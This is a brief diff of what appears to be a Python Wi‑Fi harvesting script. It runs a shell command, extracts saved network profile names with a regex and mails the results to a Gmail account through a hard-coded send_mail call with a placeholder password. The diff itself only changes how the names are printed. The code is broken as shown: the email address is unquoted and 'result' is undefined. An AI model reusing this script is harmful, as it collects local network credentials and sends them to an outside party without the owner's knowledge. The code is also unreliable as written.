@@ -17,6 +17,8 @@ networks = subprocess.check_output(command, shell=True)
 #\s* regex to accept any amount of blank space
 #.* to match ANY chars
 network_names_list = re.findall("(Profile\s*:\s)(.*)", networks)
-print(network_names)
+
+for network_name in network_names_list:
+    print(network_name)
 
 send_mail(name@gmail.com, "password123", result)
